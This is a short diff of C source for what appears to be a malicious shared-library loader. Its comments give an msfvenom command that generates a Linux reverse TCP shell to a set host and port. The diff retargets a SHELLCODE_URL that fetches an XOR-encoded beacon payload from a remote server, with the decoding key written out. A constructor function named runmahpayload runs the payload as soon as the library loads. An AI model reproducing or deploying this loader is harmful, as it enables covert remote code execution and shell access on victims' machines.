@@ -11,7 +11,7 @@
 // gcc -shared -o xorLdLibraryPath.so xorLdLibraryPath.o -ldl
 
 // msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.235.130 LPORT=8443 -f raw -o shellcode.bin
-#define SHELLCODE_URL "http://192.168.235.130:8000/beacons/agent.xor.bin"
+#define SHELLCODE_URL "http://192.168.45.1:80/beacons/agent.xor.bin"
 #define XOR_KEY       "vns69"
 
 static void runmahpayload() __attribute__((constructor));
